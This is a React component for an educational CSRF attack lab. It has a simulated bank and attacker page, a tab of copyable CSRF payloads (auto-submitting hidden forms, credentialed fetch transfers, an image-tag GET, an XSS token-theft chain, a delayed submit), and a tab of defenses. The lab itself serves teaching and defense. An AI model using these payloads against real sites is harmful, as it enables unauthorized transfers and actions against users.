'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Users, Shield, AlertTriangle, Copy, Check, Eye, EyeOff } from 'lucide-react'

export default function CSRFAttackLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [csrfProtection, setCsrfProtection] = useState<'none' | 'token' | 'samesite'>('none')
  const [attackResult, setAttackResult] = useState('')
  const [showAttackerSite, setShowAttackerSite] = useState(false)
  const [userLoggedIn, setUserLoggedIn] = useState(true)
  const [copied, setCopied] = useState(false)

  const simulateAttack = (attackType: string) => {
    setAttackResult('')
    
    switch (attackType) {
      case 'simple-form':
        if (csrfProtection === 'none') {
          setAttackResult('🚨 SUCCESS: Money transferred! CSRF vulnerability exploited!')
        } else if (csrfProtection === 'token') {
          setAttackResult('❌ BLOCKED: Missing CSRF token')
        } else if (csrfProtection === 'samesite') {
          setAttackResult('❌ BLOCKED: SameSite cookie prevented attack')
        }
        break

      case 'xhr-request':
        if (csrfProtection === 'none') {
          setAttackResult('🚨 SUCCESS: API request executed with user cookies!')
        } else if (csrfProtection === 'token') {
          setAttackResult('❌ BLOCKED: Missing CSRF header token')
        } else if (csrfProtection === 'samesite') {
          setAttackResult('❌ BLOCKED: SameSite cookie blocked XHR')
        }
        break

      case 'json-request':
        if (csrfProtection === 'none') {
          setAttackResult('🚨 SUCCESS: JSON API call succeeded!')
        } else if (csrfProtection === 'token') {
          setAttackResult('❌ BLOCKED: Invalid CSRF token in JSON payload')
        } else if (csrfProtection === 'samesite') {
          setAttackResult('❌ BLOCKED: SameSite prevented JSON request')
        }
        break
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const csrfDefenses = [
    {
      type: 'none',
      name: 'No Protection',
      description: 'Vulnerable to CSRF attacks',
      config: 'No CSRF tokens or SameSite cookies'
    },
    {
      type: 'token',
      name: 'CSRF Token',
      description: 'Requires anti-CSRF tokens',
      config: 'Set-Cookie: csrf-token=abc123; HttpOnly; Secure\nX-CSRF-Token: abc123'
    },
    {
      type: 'samesite',
      name: 'SameSite Cookies',
      description: 'Blocks cross-site requests',
      config: 'Set-Cookie: session=xyz; SameSite=Strict; HttpOnly; Secure'
    }
  ]

  const attackPayloads = [
    {
      name: 'Hidden Form Attack',
      description: 'Auto-submitting form on malicious site',
      code: `<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>`,
      technique: 'Form Auto-Submission'
    },
    {
      name: 'XHR/Fetch Attack',
      description: 'AJAX request with user credentials',
      code: `fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    to: 'attacker-account',
    amount: 1000
  })
});`,
      technique: 'XMLHttpRequest'
    },
    {
      name: 'Image Tag Attack',
      description: 'Using IMG tag to trigger GET requests',
      code: `<img src="https://bank.com/transfer?to=attacker&amount=1000" 
       style="display:none" onload="alert('Transfer complete!')">`,
      technique: 'GET Request via Image'
    },
    {
      name: 'CORS Preflight Bypass',
      description: 'Simple requests that bypass preflight',
      code: `fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'to=attacker-account&amount=1000'
});`,
      technique: 'Simple Request'
    }
  ]

  const currentDefense = csrfDefenses.find(d => d.type === csrfProtection)

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 sm:p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-pink-500 rounded-lg">
              <Users className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-slate-900">CSRF Attack Lab</h1>
              <p className="text-slate-600">Learn how cross-site request forgery attacks exploit user trust and how to defend against them</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              CSRF attacks force authenticated users to perform unwanted actions on websites where they're currently logged in.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-3 h-auto">
            <TabsTrigger value="demo" className="text-xs sm:text-sm">Interactive Demo</TabsTrigger>
            <TabsTrigger value="attacks" className="text-xs sm:text-sm">Attack Techniques</TabsTrigger>
            <TabsTrigger value="defenses" className="text-xs sm:text-sm">Defense Strategies</TabsTrigger>
          </TabsList>

          {/* Interactive Demo Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Victim Site */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Victim Bank Site</span>
                  </CardTitle>
                  <CardDescription>
                    Your legitimate banking application
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* User Status */}
                  <div className="p-3 bg-slate-50 rounded-lg border border-slate-300">
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-medium">User Status:</span>
                      <Badge variant={userLoggedIn ? "default" : "secondary"}>
                        {userLoggedIn ? 'Logged In' : 'Logged Out'}
                      </Badge>
                    </div>
                    {userLoggedIn && (
                      <div className="mt-2 text-sm text-slate-600">
                        <p>Account: john.doe@bank.com</p>
                        <p>Balance: $10,000.00</p>
                      </div>
                    )}
                  </div>

                  {/* Protection Status */}
                  <div className="p-3 bg-slate-50 rounded-lg border border-slate-300">
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-medium">CSRF Protection:</span>
                      <Badge variant={csrfProtection === 'none' ? 'destructive' : 'default'}>
                        {currentDefense?.name}
                      </Badge>
                    </div>
                    <p className="text-xs text-slate-600 mt-1">{currentDefense?.description}</p>
                  </div>

                  {/* Transfer Form */}
                  <div className="space-y-3">
                    <h4 className="font-semibold">Transfer Money</h4>
                    <div className="space-y-2">
                      <input
                        type="text"
                        placeholder="Recipient account"
                        className="w-full p-2 border border-slate-300 rounded text-sm"
                        defaultValue="savings-account"
                      />
                      <input
                        type="number"
                        placeholder="Amount"
                        className="w-full p-2 border border-slate-300 rounded text-sm"
                        defaultValue="100"
                      />
                      <Button className="w-full" size="sm">
                        🏦 Transfer Money
                      </Button>
                    </div>
                  </div>

                  {/* Technical Details */}
                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Current Security Headers:</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs whitespace-pre-wrap">
{`Protection: ${currentDefense?.config}
Session Cookie: session=${userLoggedIn ? 'authenticated123' : 'none'}
SameSite: ${csrfProtection === 'samesite' ? 'Strict' : 'None'}`}
                    </Code>
                  </div>
                </CardContent>
              </Card>

              {/* Attacker Site */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <AlertTriangle className="w-5 h-5" />
                    <span>Attacker Malicious Site</span>
                  </CardTitle>
                  <CardDescription>
                    Fake website that hosts CSRF attacks
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Toggle Attacker View */}
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="show-attacker"
                      checked={showAttackerSite}
                      onChange={(e) => setShowAttackerSite(e.target.checked)}
                      className="rounded"
                    />
                    <label htmlFor="show-attacker" className="text-sm">
                      Show attacker site content
                    </label>
                  </div>

                  {showAttackerSite && (
                    <div className="space-y-4">
                      {/* Fake Content */}
                      <div className="p-4 bg-gradient-to-r from-purple-50 to-pink-50 rounded-lg border border-purple-200">
                        <h4 className="font-bold text-purple-900 mb-2">🎁 FREE GIVEAWAY!</h4>
                        <p className="text-sm text-purple-800 mb-3">
                          Click below to claim your free iPhone 15! Limited time offer!
                        </p>
                        
                        {/* Hidden CSRF Forms */}
                        <div className="space-y-2">
                          <Button
                            onClick={() => simulateAttack('simple-form')}
                            className="w-full bg-purple-600 hover:bg-purple-700"
                            size="sm"
                          >
                            📱 Claim Free iPhone
                          </Button>
                          
                          <Button
                            onClick={() => simulateAttack('xhr-request')}
                            className="w-full bg-pink-600 hover:bg-pink-700"
                            size="sm"
                          >
                            🎮 Play Game to Win
                          </Button>
                          
                          <Button
                            onClick={() => simulateAttack('json-request')}
                            className="w-full bg-indigo-600 hover:bg-indigo-700"
                            size="sm"
                          >
                            🏆 Enter Contest
                          </Button>
                        </div>
                      </div>

                      {/* Hidden Attack Code */}
                      <div className="p-3 bg-red-50 border border-red-200 rounded">
                        <h4 className="font-semibold text-red-900 mb-1 text-sm">Hidden Attack Code:</h4>
                        <Code className="block p-2 bg-white rounded text-xs">
{`<!-- Hidden CSRF form -->
<form action="https://bank.com/transfer" 
      method="POST" id="hidden-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>

<!-- Auto-submit when user clicks -->
<script>
document.getElementById('hidden-form').submit();
</script>`}
                        </Code>
                      </div>
                    </div>
                  )}

                  {/* Attack Result */}
                  {attackResult && (
                    <Alert className={attackResult.includes('SUCCESS') ? 'border-red-200 bg-red-50' : 'border-green-200 bg-green-50'}>
                      <AlertDescription className={attackResult.includes('SUCCESS') ? 'text-red-800' : 'text-green-800'}>
                        {attackResult}
                      </AlertDescription>
                    </Alert>
                  )}

                  {/* Protection Controls */}
                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Test Different Protections:</h4>
                    <div className="space-y-1">
                      {csrfDefenses.map(defense => (
                        <Button
                          key={defense.type}
                          variant={csrfProtection === defense.type ? "default" : "outline"}
                          size="sm"
                          onClick={() => setCsrfProtection(defense.type as any)}
                          className="w-full justify-start text-xs"
                        >
                          {csrfProtection === defense.type && <Shield className="w-3 h-3 mr-1" />}
                          {defense.name}
                        </Button>
                      ))}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Attack Flow Visualization */}
            <Card>
              <CardHeader>
                <CardTitle>🔄 CSRF Attack Flow</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                      <Users className="w-8 h-8 text-blue-600" />
                    </div>
                    <h4 className="font-semibold">1. User Logs In</h4>
                    <p className="text-sm text-slate-700">
                      User authenticates to bank site
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto">
                      <Eye className="w-8 h-8 text-orange-600" />
                    </div>
                    <h4 className="font-semibold">2. Visits Evil Site</h4>
                    <p className="text-sm text-slate-700">
                      User navigates to malicious page
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                      <AlertTriangle className="w-8 h-8 text-red-600" />
                    </div>
                    <h4 className="font-semibold">3. Attack Triggers</h4>
                    <p className="text-sm text-slate-700">
                      Hidden form auto-submits
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto">
                      <Shield className="w-8 h-8 text-purple-600" />
                    </div>
                    <h4 className="font-semibold">4. Browser Sends</h4>
                    <p className="text-sm text-slate-700">
                      Cookies included automatically
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                      <Copy className="w-8 h-8 text-green-600" />
                    </div>
                    <h4 className="font-semibold">5. Action Executed</h4>
                    <p className="text-sm text-slate-700">
                      Bank processes legitimate request
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Attack Techniques Tab */}
          <TabsContent value="attacks" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {attackPayloads.map((payload, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center justify-between">
                      <span>{payload.name}</span>
                      <Badge variant="outline">{payload.technique}</Badge>
                    </CardTitle>
                    <CardDescription>{payload.description}</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      <div>
                        <h4 className="font-semibold text-sm mb-1">Attack Code:</h4>
                        <Code className="block p-2 bg-slate-50 rounded text-xs max-h-32 overflow-y-auto">
                          {payload.code}
                        </Code>
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => copyToClipboard(payload.code)}
                        className="w-full"
                      >
                        {copied ? <Check className="w-4 h-4 mr-1" /> : <Copy className="w-4 h-4 mr-1" />}
                        Copy Code
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Advanced Techniques */}
            <Card>
              <CardHeader>
                <CardTitle>🔬 Advanced CSRF Techniques</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-3">
                    <h4 className="font-semibold">CSRF + XSS Chain</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`// XSS steals CSRF token
<script>
  const token = document.querySelector('meta[name="csrf-token"]').content;
  fetch('/api/transfer', {
    method: 'POST',
    headers: { 'X-CSRF-Token': token },
    body: JSON.stringify({to: 'attacker', amount: 1000})
  });
</script>`}
                    </Code>
                    <p className="text-sm text-slate-700">
                      XSS can bypass CSRF token protection by stealing tokens
                    </p>
                  </div>

                  <div className="space-y-3">
                    <h4 className="font-semibold">Timing Attack</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`// Delayed attack to avoid detection
setTimeout(() => {
  const form = document.createElement('form');
  form.action = 'https://bank.com/transfer';
  form.method = 'POST';
  document.body.appendChild(form);
  form.submit();
}, 5000); // 5 second delay`}
                    </Code>
                    <p className="text-sm text-slate-700">
                      Delays attacks to avoid user detection
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Defense Strategies Tab */}
          <TabsContent value="defenses" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>CSRF Tokens</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <Code className="block p-2 bg-green-50 border border-green-200 rounded text-xs">
{`// Generate and validate tokens
const csrfToken = generateRandomToken();
setCookie('csrf-token', csrfToken);

// Validate on request
if (req.headers['x-csrf-token'] !== req.cookies['csrf-token']) {
  return res.status(403).send('Invalid CSRF token');
}`}
                  </Code>
                  <p className="text-sm text-slate-700">
                    Random tokens validated on each request
                  </p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>SameSite Cookies</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <Code className="block p-2 bg-green-50 border border-green-200 rounded text-xs">
{`// Set SameSite attribute
Set-Cookie: session=abc123; 
           SameSite=Strict; 
           HttpOnly; 
           Secure;

// Or SameSite=Lax for some cross-site requests`}
                  </Code>
                  <p className="text-sm text-slate-700">
                    Blocks cookies on cross-site requests
                  </p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Double Submit</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <Code className="block p-2 bg-green-50 border border-green-200 rounded text-xs">
{`// Token in cookie + header
Set-Cookie: csrf-token=abc123

// Client sends both
headers: {
  'X-CSRF-Token': getCookie('csrf-token')
}

// Server compares both`}
                  </Code>
                  <p className="text-sm text-slate-700">
                    Token in both cookie and request header
                  </p>
                </CardContent>
              </Card>
            </div>

            {/* Implementation Guide */}
            <Card>
              <CardHeader>
                <CardTitle>🛡️ Complete Defense Implementation</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="font-semibold mb-3">Frontend Implementation</h4>
                    <Code className="block p-3 bg-blue-50 border border-blue-200 rounded text-sm">
{`// React example with CSRF protection
import { getCsrfToken } from '@/lib/csrf';

function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    setCsrfToken(getCsrfToken());
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const response = await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      credentials: 'same-origin',
      body: JSON.stringify(formData)
    });
  };
}`}
                    </Code>
                  </div>

                  <div>
                    <h4 className="font-semibold mb-3">Backend Implementation</h4>
                    <Code className="block p-3 bg-green-50 border border-green-200 rounded text-sm">
{`// Express.js middleware
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// CSRF token endpoint
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected routes
app.post('/api/transfer', (req, res) => {
  // CSRF validation automatically handled by csurf middleware
  // Process transfer logic here
});`}
                    </Code>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Testing Checklist */}
            <Card>
              <CardHeader>
                <CardTitle>✅ CSRF Security Testing</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <h4 className="font-semibold">Manual Testing</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Test form submissions from other sites</li>
                      <li>□ Verify XHR requests are blocked</li>
                      <li>□ Check token validation</li>
                      <li>□ Test SameSite cookie behavior</li>
                      <li>□ Verify double submit patterns</li>
                    </ul>
                  </div>
                  <div className="space-y-2">
                    <h4 className="font-semibold">Automated Testing</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ CSRF vulnerability scanners</li>
                      <li>□ Security regression tests</li>
                      <li>□ Header validation tests</li>
                      <li>□ Cross-origin request tests</li>
                      <li>□ Integration with CI/CD pipeline</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}